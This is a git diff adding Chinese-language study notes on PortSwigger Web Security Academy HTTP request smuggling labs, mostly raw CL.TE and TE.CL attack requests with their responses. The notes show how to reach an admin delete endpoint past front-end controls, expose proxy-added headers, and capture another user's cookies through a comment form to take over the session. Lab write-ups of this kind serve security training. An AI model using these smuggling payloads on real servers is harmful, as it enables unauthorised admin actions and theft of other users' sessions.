@@ -523,7 +523,7 @@ X => 留在 unprocessed => 下一個用戶可能無法正常訪問
 
 是說，我怎麼覺得這個概念應該安排在 [Lab: HTTP request smuggling, obfuscating the TE header](#lab-http-request-smuggling-obfuscating-the-te-header) 之前，因為這題其實也需要去測試，是 CL.TE 還是 TE.CL
 
-##
+## Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
 
 | Dimension | Description                                                                                                                  |
 | --------- | ---------------------------------------------------------------------------------------------------------------------------- |
@@ -599,6 +599,501 @@ Buffer.byteLength(
   `POST / HTTP/1.1\r\nHost: 0a5c002d04f9b0c6823be2c800db007d.web-security-academy.net\r\n\r\n`,
 );
 ```
+
+## Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
+
+| Dimension | Description                                                                                                                  |
+| --------- | ---------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling/finding#confirming-te-cl-vulnerabilities-using-differential-responses |
+| Lab       | https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses               |
+
+不用 BApp 的工具，自己算 Byte Length 真的累...但我覺得第一次學習，一定要自己算，等到熟悉了再用工具
+
+PoC
+
+```
+POST / HTTP/1.1
+Host: 0a7c0042036ae33a805ee45d00c000e9.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+
+76
+POST /404 HTTP/1.1
+Host: 0a7c0042036ae33a805ee45d00c000e9.web-security-academy.net
+Content-Length: 98
+
+Only11Bytes
+0
+
+
+```
+
+Frontend 原封不動發送給 Backend，Backend 解析完
+
+```
+POST / HTTP/1.1
+Host: 0a7c0042036ae33a805ee45d00c000e9.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+
+76
+
+```
+
+第二次發送
+
+```
+POST / HTTP/1.1
+Host: 0a7c0042036ae33a805ee45d00c000e9.web-security-academy.net
+
+
+```
+
+組合起來就是
+
+```
+POST /404 HTTP/1.1
+Host: 0a7c0042036ae33a805ee45d00c000e9.web-security-academy.net
+Content-Length: 98
+
+Only11Bytes
+0
+
+POST / HTTP/1.1
+Host: 0a7c0042036ae33a805ee45d00c000e9.web-security-academy.net
+```
+
+## 真實世界情況
+
+https://portswigger.net/web-security/request-smuggling/finding
+
+- The "attack" request and the "normal" request should be sent to the server using different network connections.
+- The "attack" request and the "normal" request should use the same URL and parameter names, as far as possible.
+- You should send the "normal" request immediately after the "attack" request.
+- If your "attack" and "normal" requests are forwarded to different back-end systems, then the attack will fail.
+- If your attack succeeds in interfering with a subsequent request, but this wasn't the "normal" request that you sent to detect the interference, then this means that another application user was affected by your attack.
+
+## Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+
+| Dimension | Description                                                                                                                          |
+| --------- | ------------------------------------------------------------------------------------------------------------------------------------ |
+| Document  | https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-bypass-front-end-security-controls |
+| Lab       | https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te                                |
+
+attack request
+
+```
+POST / HTTP/1.1
+Host: 0ac600c604089b5c8218accb007000ad.web-security-academy.net
+Cookie: session=qUOrUBA9HpdEl2ZdI8srfUZbekw3mLIS
+Transfer-Encoding: chunked
+Content-Length: 38
+
+0
+
+GET /admin HTTP/1.1
+Hello: world
+```
+
+normal request
+
+```
+POST / HTTP/1.1
+Host: 0ac600c604089b5c8218accb007000ad.web-security-academy.net
+Cookie: session=qUOrUBA9HpdEl2ZdI8srfUZbekw3mLIS
+
+
+```
+
+合併起來是
+
+```
+GET /admin HTTP/1.1
+Hello: worldPOST / HTTP/1.1
+Host: 0ac600c604089b5c8218accb007000ad.web-security-academy.net
+Cookie: session=qUOrUBA9HpdEl2ZdI8srfUZbekw3mLIS
+
+
+```
+
+normal request's response
+
+```
+HTTP/1.1 401 Unauthorized
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 2676
+
+Admin interface only available to local users
+```
+
+如果直接透過瀏覽器訪問 `/admin` 的話，會看到 `"Path /admin is blocked"`，代表我們的 smuggled request 是有成功 proxy 到 backend，只是 backend 還有做一層防護
+
+猜測 Host 要注入 localhost，重新構造一次 attack request
+
+```
+POST / HTTP/1.1
+Host: 0ac600c604089b5c8218accb007000ad.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 64
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 86
+
+x=
+```
+
+normal request
+
+```
+POST / HTTP/1.1
+Host: 0ac600c604089b5c8218accb007000ad.web-security-academy.net
+
+
+```
+
+合併起來是
+
+```
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 86
+
+x=POST / HTTP/1.1
+Host: 0ac600c604089b5c8218accb007000ad.web-security-academy.net
+
+
+```
+
+成功 Bypass
+
+## Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+
+| Dimension | Description                                                                                                                          |
+| --------- | ------------------------------------------------------------------------------------------------------------------------------------ |
+| Document  | https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-bypass-front-end-security-controls |
+| Lab       | https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl                                |
+
+attack request
+
+```
+POST / HTTP/1.1
+Host: 0af200b404da314680cf304600870056.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 4
+
+5e
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Length: 98
+
+Only11Bytes
+0
+
+
+```
+
+Frontend 原封不動發送給 Backend，Backend 解析完
+
+```
+POST / HTTP/1.1
+Host: 0af200b404da314680cf304600870056.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 4
+
+5e
+
+```
+
+剩下這些留在 Backend unprocessed
+
+```
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Length: 98
+
+Only11Bytes
+0
+
+
+```
+
+normal request
+
+```
+POST / HTTP/1.1
+Host: 0af200b404da314680cf304600870056.web-security-academy.net
+
+
+```
+
+組合起來就是
+
+```
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Length: 98
+
+Only11Bytes
+0
+
+POST / HTTP/1.1
+Host: 0af200b404da314680cf304600870056.web-security-academy.net
+
+
+```
+
+P.S. 其實真要算的話，98 應該要改成 102 會比較準確，才可以把最後的 `\r\n\r\n` 也吃掉
+
+## Revealing front-end request rewriting
+
+真實世界中，Nginx 把 HTTP Request Proxy Pass 到 Backend 的時候，可能會加上一些 Custom Headers，我們的 Smuggled Request Proxy 到 Backend 若沒有這些 Custom Headers 可能會導致請求失敗，解法有兩種
+
+第一種是 `TRACE / HTTP/1.1`，但實務上會開啟 TRACE 的 Web Server 不多，大概就一些極度老舊的 Apache 預設是開的
+
+第二種是 PortSwigger 提供的技巧，找到一個可以 Reflect Request Body 到 Response 的 Endpoint，例如登入功能
+
+```
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+
+email=wiener@normal-user.net
+```
+
+登入成功後，Response Body 會包含
+
+```html
+<input id="email" value="wiener@normal-user.net" type="text" />
+```
+
+attack request
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 135
+Transfer-Encoding: chunked
+
+0
+
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+email=
+```
+
+CL.TE，Frontend Server 原封不動把 HTTP Request Proxy 到 Backend Server，Backend Server 用 TE
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 135
+Transfer-Encoding: chunked
+
+0
+
+
+```
+
+剩下這些留在 Backend Server 的 unprocessed
+
+```
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+email=
+```
+
+normal request
+
+```
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+```
+
+結合後
+
+```
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+email=POST /login HTTP/1.1
+Host: vulnerable-website.com
+```
+
+normal request's response html
+
+```html
+<input id="email" value="POST /login HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-For: 1.3.3.7
+X-Forwarded-Proto: https
+X-TLS-Bits: 128
+X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
+X-TLS-Version: TLSv1.2
+x-nr-external-service: external
+```
+
+:::info
+由於我們不知道 Frontend Server 到 Backend Server 中間塞了多少 Custom Headers，所以需要猜測 Content-Length
+
+- 太短的話，Headers 會被截斷
+- 太長的話，Backend Server 會一直等待 CL 長度湊滿，導致 timeout
+  :::
+
+## Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting
+
+| Dimension | Description                                                                                              |
+| --------- | -------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling/exploiting#revealing-front-end-request-rewriting  |
+| Lab       | https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting |
+
+這題是 CL.TE
+
+attack request
+
+```
+POST / HTTP/1.1
+Host: 0a630095037681bc808d620900d500d5.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 166
+
+0
+
+POST / HTTP/1.1
+Host: 0a630095037681bc808d620900d500d5.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 150
+
+search=
+```
+
+normal request
+
+```
+POST / HTTP/1.1
+Host: 0a630095037681bc808d620900d500d5.web-security-academy.net
+
+
+```
+
+normal request's response
+
+```
+HTTP/1.1 500 Internal Server Error
+Content-Type: text/html; charset=utf-8
+Connection: close
+Content-Length: 185
+
+<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Communication timed out: sent = true, receivedEmptyResponse = true, timedOut = true</h1></body></html>
+```
+
+看來 `Content-Length: 150` 太大，改成 `Content-Length: 100` 之後，得到
+
+```
+0 search results for 'POST / HTTP/1.1
+X-EepdRe-Ip: xx.xxx.x.xxx
+Host: 0a630095037681bc808d620900d500d5.web-securi'
+```
+
+attack request
+
+```
+POST / HTTP/1.1
+Host: 0a630095037681bc808d620900d500d5.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 217
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: 0a630095037681bc808d620900d500d5.web-security-academy.net
+X-EepdRe-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+search=
+```
+
+P.S. `Content-Length: 118` 的算法
+
+```ts
+Buffer.byteLength(
+  `search=POST / HTTP/1.1\r\nX-EepdRe-Ip: xx.xxx.x.xxx\r\nHost: 0a630095037681bc808d620900d500d5.web-security-academy.net\r\n\r\n`,
+);
+```
+
+normal request
+
+```
+POST / HTTP/1.1
+Host: 0a630095037681bc808d620900d500d5.web-security-academy.net
+
+
+```
+
+## Capturing other users' requests
+
+https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests
+
+利用的技巧跟 [Revealing front-end request rewriting](#revealing-front-end-request-rewriting) 類似
+
+instead of "找到一個可以 Reflect Request Body 到 Response 的 Endpoint", 我們要尋找一個可以 "Capturing other users' requests" 的 Endpoint，例如: 評論功能,聊天室
+
+## Lab: Exploiting HTTP request smuggling to capture other users' requests
+
+| Dimension | Description                                                                                        |
+| --------- | -------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests   |
+| Lab       | https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests |
+
+attack request
+
+```
+POST / HTTP/1.1
+Host: 0a7000ff04e7fea280e58580009c00f1.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 311
+
+0
+
+POST /post/comment HTTP/1.1
+Host: 0a7000ff04e7fea280e58580009c00f1.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=a7nyuWj07MlC7Ulj1W8ZFCs30NXQBKnT
+Content-Length: 930
+
+csrf=ihwPQx34auWPOeiAQAOYH37dr7leL2BF&postId=1&name=victim8&email=victim8%40email&comment=
+```
+
+normal request => 瀏覽器訪問 /post?postId=1
+
+- 如果看到 /post/comment/confirmation?postId=1 => 代表是自己吃到 smuggled request
+- 如果看到 /post?postId=1 => 代表是 victim 吃到 smuggled request => 這時候就可以去看留言
+
+我們每發 5 個請求，victim 就會發 1 個請求，所以剛好都會在第三輪 attack request 發完後，victim 中招；持續增加 Content-Length 後，最終在 930 這邊停下來
+
+victim comment
+
+```
+GET / HTTP/1.1 Host: 0a7000ff04e7fea280e58580009c00f1.web-security-academy.net sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24" sec-ch-ua-mobile: ?0 sec-ch-ua-platform: "Linux" upgrade-insecure-requests: 1 user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 sec-fetch-site: none sec-fetch-mode: navigate sec-fetch-user: ?1 sec-fetch-dest: document accept-encoding: gzip, deflate, br, zstd accept-language: en-US,en;q=0.9 priority: u=0, i cookie: victim-fingerprint=2w0vr7P674Qojl43HVlxKJUbg12QXMtS; secret=swjanvSP3Bx2GxUCLiKgWprC1SgmwZWl; session=JcCbS08nw0a8beFYjLRLEWywvDtEuzyv Content-Length: 0
+```
+
+把這些 cookie 塞到自己的瀏覽器，訪問 /my-account，即可通關～
 
 ## 參考資料
 
